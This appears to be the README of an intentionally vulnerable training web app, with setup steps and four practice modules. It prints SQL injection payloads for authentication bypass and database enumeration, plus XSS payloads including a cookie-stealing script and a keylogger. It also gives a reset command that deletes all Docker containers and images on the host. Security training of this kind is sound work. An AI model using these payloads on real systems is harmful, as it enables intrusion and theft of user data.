# 516 Hackers Vulnerability Playground 🔓

An intentionally vulnerable web application designed for security training, similar to DVWA but modular. Perfect for learning about web vulnerabilities in a safe, controlled environment.

![Security Training](https://img.shields.io/badge/Purpose-Security%20Training-red)
![Docker](https://img.shields.io/badge/Platform-Docker-blue)
![Node.js](https://img.shields.io/badge/Backend-Node.js-green)
![MySQL](https://img.shields.io/badge/Database-MySQL-orange)

## ⚠️ IMPORTANT WARNING

**FOR TRAINING AND EDUCATIONAL PURPOSES ONLY**

- 🚫 **DO NOT** deploy in production environments
- 🚫 **DO NOT** expose to the internet
- 🚫 **DO NOT** use with real/sensitive data
- ✅ **ONLY** use in isolated, local environments
- ✅ **ONLY** for legitimate security training

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose installed
- Git installed
- At least 2GB free disk space

### Step-by-Step Setup

#### 1. Clone the Repository
```bash
# Clone using HTTPS
git clone https://github.com/516hackers/516-hackers-vuln-playground.git

# Or using SSH
git clone git@github.com:516hackers/516-hackers-vuln-playground.git

# Navigate to project directory
cd 516-hackers-vuln-playground
```

#### 2. Build and Run with Docker
```bash
# Build and start all services
docker-compose up --build

# To run in background (detached mode)
docker-compose up -d --build
```

#### 3. Access the Application
Open your browser and navigate to:
```
http://localhost:3000
```

#### 4. Verify Installation
You should see the main dashboard with four vulnerability modules. The application comes pre-loaded with sample data.

## 🛠️ Project Structure

```
516-hackers-vuln-playground/
├── docker-compose.yml          # Multi-container setup
├── README.md                   # This file
├── backend/
│   ├── package.json           # Node.js dependencies
│   ├── server.js              # Main Express server
│   ├── Dockerfile             # Backend container setup
│   ├── routes/                # Vulnerability modules
│   │   ├── sqli.js           # SQL Injection
│   │   ├── xss.js            # Cross-site Scripting
│   │   ├── auth.js           # Authentication Bypass
│   │   └── file-upload.js    # File Upload vulnerabilities
│   └── database/
│       └── init.sql          # Database schema and sample data
├── frontend/
│   ├── index.html            # Main interface
│   ├── css/
│   │   └── style.css         # Styling
│   └── js/
│       └── app.js            # Frontend logic
└── scripts/
    ├── test-sqli.js          # SQLi testing scripts
    ├── test-xss.js           # XSS testing scripts
    └── test-auth.js          # Auth testing scripts
```

## 📚 Vulnerability Modules

### 1. SQL Injection (SQLi) 💉
**Location**: SQL Injection module in the web interface

**Vulnerable Endpoint**: `/sqli/search`

**Practice Payloads**:
```sql
-- Basic bypass
admin' OR '1'='1

-- Union attack
' UNION SELECT 1,2,3,4,5-- -

-- Database enumeration
' UNION SELECT version(),user(),database(),4,5-- -

-- Table extraction
' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables-- -
```

**Learning Objectives**:
- Understand how SQL injection works
- Learn to exploit authentication bypass
- Practice data extraction techniques
- Compare vulnerable vs secure code

### 2. Cross-Site Scripting (XSS) 🦠
**Location**: XSS module in the web interface

**Vulnerable Endpoint**: `/xss/comment`

**Practice Payloads**:
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

-- Image-based XSS
<img src=x onerror=alert(1)>

-- Cookie theft
<script>fetch('http://localhost:3000/steal?cookie='+document.cookie)</script>

-- Keylogger
<script>document.onkeypress=function(e){fetch('http://localhost:3000/log?key='+e.key)}</script>
```

**Learning Objectives**:
- Understand reflected vs stored XSS
- Learn DOM-based XSS techniques
- Practice input sanitization methods
- Compare vulnerable vs secure implementations

### 3. Authentication Bypass 🔑
**Location**: Authentication Bypass module

**Vulnerable Endpoint**: `/auth/login-weak`

**Practice Techniques**:
```sql
-- SQL injection in login
admin' OR '1'='1'-- -

-- Password field bypass
admin' OR '1'='1'-- -

-- Always true condition
' OR 1=1-- -
```

**Learning Objectives**:
- Understand weak authentication mechanisms
- Learn session management vulnerabilities
- Practice privilege escalation
- Implement secure authentication

### 4. File Upload Vulnerabilities 📁
**Location**: File Upload module

**Vulnerable Endpoint**: `/file-upload/insecure`

**Practice Uploads**:
- PHP shell files
- Executable files with dangerous extensions
- Overwrite existing files
- Path traversal in filenames

**Learning Objectives**:
- Understand unrestricted file upload risks
- Learn file type validation
- Practice secure upload configurations
- Implement proper file sanitization

## 🔧 Management Commands

### Starting and Stopping
```bash
# Start services
docker-compose up

# Start in background
docker-compose up -d

# Stop services
docker-compose down

# Stop and remove volumes (reset data)
docker-compose down -v

# View logs
docker-compose logs

# View specific service logs
docker-compose logs web
docker-compose logs db
```

### Database Operations
```bash
# Access MySQL database
docker-compose exec db mysql -u root -p vuln_app
# Password: password

# Reset database
docker-compose down -v
docker-compose up -d
```

### Development Commands
```bash
# Access backend container
docker-compose exec web sh

# Install new dependencies
docker-compose exec web npm install <package>

# View application logs
docker-compose logs web -f
```

## 🧪 Testing Scripts

Run automated tests to verify vulnerabilities:

```bash
# Test SQL Injection vulnerabilities
node scripts/test-sqli.js

# Test XSS vulnerabilities
node scripts/test-xss.js

# Test authentication bypass
node scripts/test-auth.js
```

## 🎯 Learning Path

### Beginner Level
1. Start with SQL Injection module
2. Try basic payloads like `admin' OR '1'='1`
3. Understand how the vulnerable code works
4. Compare with the secure version

### Intermediate Level
1. Practice advanced SQLi techniques
2. Experiment with different XSS payloads
3. Try authentication bypass methods
4. Understand session management issues

### Advanced Level
1. Chain multiple vulnerabilities
2. Write custom exploit scripts
3. Analyze the secure code implementations
4. Propose additional security improvements

## 🔒 Security Best Practices Demonstrated

Each module includes both **vulnerable** and **secure** implementations:

### SQL Injection Protection
- **Vulnerable**: String concatenation in queries
- **Secure**: Parameterized queries with prepared statements

### XSS Protection
- **Vulnerable**: Direct output without sanitization
- **Secure**: Input validation and output encoding

### Authentication Security
- **Vulnerable**: Plain text passwords, SQL in authentication
- **Secure**: Password hashing, parameterized queries, session management

### File Upload Security
- **Vulnerable**: No file type checking, original filenames
- **Secure**: Whitelist validation, safe filenames, size limits

## 🐛 Troubleshooting

### Common Issues

**Port already in use**:
```bash
# Change ports in docker-compose.yml
ports:
  - "3001:3000"  # Use different host port
```

**Database connection issues**:
```bash
# Reset everything
docker-compose down -v
docker-compose up --build
```

**Application not loading**:
```bash
# Check if all services are running
docker-compose ps

# Check logs for errors
docker-compose logs
```

**File uploads not working**:
```bash
# Ensure upload directories exist
mkdir -p backend/uploads backend/secure-uploads

# Check directory permissions
chmod 755 backend/uploads backend/secure-uploads
```

### Reset Everything
```bash
# Complete reset
docker-compose down -v
docker rm -f $(docker ps -aq)
docker rmi -f $(docker images -q)
docker-compose up --build
```

## 📖 Educational Resources

### Recommended Learning Materials
- OWASP Top 10
- Web Application Security Testing methodologies
- Secure coding practices
- Penetration testing frameworks

### Next Steps After This Playground
1. Try other vulnerable applications (DVWA, WebGoat, bWAPP)
2. Practice on bug bounty platforms (with permission)
3. Study secure coding guidelines
4. Explore advanced exploitation techniques

## 🤝 Contributing

We welcome contributions! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

### Adding New Vulnerabilities
1. Create new route file in `backend/routes/`
2. Add frontend interface in `frontend/`
3. Update navigation in `frontend/index.html`
4. Add test scripts in `scripts/`
5. Update this README

## 📄 License

This project is for educational purposes only. Use responsibly and only in environments you own or have explicit permission to test.

## 🆘 Support

If you encounter issues:
1. Check the troubleshooting section above
2. Review Docker and system requirements
3. Check the GitHub issues page
4. Create a new issue with detailed information

---

**Remember**: With great power comes great responsibility. Use these skills ethically and legally! 🛡️

---

*Created with ❤️ by 516 Hackers for the security community*
